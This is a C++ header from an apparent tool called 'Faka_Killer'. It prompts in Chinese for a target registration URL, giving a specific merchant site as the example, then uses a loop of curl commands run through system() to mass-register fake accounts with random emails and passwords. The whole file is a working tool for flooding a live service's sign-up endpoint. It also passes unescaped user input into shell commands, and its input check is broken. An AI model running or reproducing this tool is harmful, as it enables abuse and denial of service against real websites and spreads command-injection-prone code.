#pragma once
#include"Faka_Killer.h"
#define cmd_utf_8 system("chcp 65001")

void curl_put_read();
void curl_put(string url, int regnum);
void curl_post_read();
void curl_post(string url, int regnum);
void curl_get_read();
void curl_get(string url, int regnum);


void curl_choose()
{
	char choose;
	printf("请选择你的请求类型（输入编号):\n1.put\n2.post\n3.get\n");
read:
	cin >> choose;
	if (int(choose) - int('0') < 1 && int(choose) - int('0') > 9)
	{
		printf("读取错误，请重新输入\n");
		goto read;
	}
	switch(int(choose) - int('0'))
	{
	case 1:curl_put_read(); break;
	case 2:curl_post_read(); break;
	case 3:curl_get_read(); break;
	default: {
		cout << "方法未找到,请重新输入:\n";
		goto read;
	}
	}
	return ;
}

string curl_put_url;
int curl_put_regnum;

void curl_put_read()
{
	cout << "请输入目标url （例如:http://www.kamiwu.cn/api/merchant/auth/register):";
	cin >> curl_put_url;
	cout << "\n请输入注册数量:";
	cin >> curl_put_regnum;

	curl_put(curl_put_url, curl_put_regnum);
}

string curl_post_url;
int curl_post_regnum;

void curl_post_read()
{
	cout << "请输入目标url （例如:http://www.kamiwu.cn/api/merchant/auth/register):";
	cin >> curl_post_url;
	cout << "\n请输入注册数量:";
	cin >> curl_post_regnum;

	curl_post(curl_post_url, curl_post_regnum);
}

string curl_get_url;
int curl_get_regnum;

void curl_get_read()
{
	cout << "请输入目标url （例如:http://www.kamiwu.cn/api/merchant/auth/register):";
	cin >> curl_get_url;
	cout << "\n请输入注册数量:";
	cin >> curl_get_regnum;

	curl_get(curl_get_url, curl_get_regnum);
}

void curl_put(string url, int regnum)
{
	cmd_utf_8;
	system("cls");
	system("title Curl Put");

	for (int i = 1; i<=regnum; i++)
	{
		string curl_cmd = "curl -v -X PUT -d \"email=" + GetRandomStr(8) + "@" + GetRandomStr(7) + ".com" + "&password=";
		string password = GetRandomStr(16);
		curl_cmd = curl_cmd + password + "&password_confirmation=" + password + "&checkTos=true\" "+url+"\"";
		char cmd[800];
		strcpy(cmd, curl_cmd.c_str());
		system(cmd);
		printf("\nRegistered Account:%d\n", i);
	}
	system("pause");
}

void curl_post(string url, int regnum)
{
	cmd_utf_8;
	system("cls");
	system("title Curl Put");

	for (int i = 1; i <= regnum; i++)
	{
		string curl_cmd = "curl -v -X POST -d \"email=" + GetRandomStr(8) + "@" + GetRandomStr(7) + ".com" + "&password=";
		string password = GetRandomStr(16);
		curl_cmd = curl_cmd + password + "&password_confirmation=" + password + "&checkTos=true\" " + url + "\"";
		char cmd[800];
		strcpy(cmd, curl_cmd.c_str());
		system(cmd);
		printf("\nRegistered Account:%d\n", i);
	}
	system("pause");
}

void curl_get(string url, int regnum)
{
	cmd_utf_8;
	system("cls");
	system("title Curl Put");

	for (int i = 1; i <= regnum; i++)
	{
		string curl_cmd = "curl -v -X GET -d \"email=" + GetRandomStr(8) + "@" + GetRandomStr(7) + ".com" + "&password=";
		string password = GetRandomStr(16);
		curl_cmd = curl_cmd + password + "&password_confirmation=" + password + "&checkTos=true\" " + url + "\"";
		char cmd[800];
		strcpy(cmd, curl_cmd.c_str());
		system(cmd);
		printf("\nRegistered Account:%d\n", i);
	}
	system("pause");
}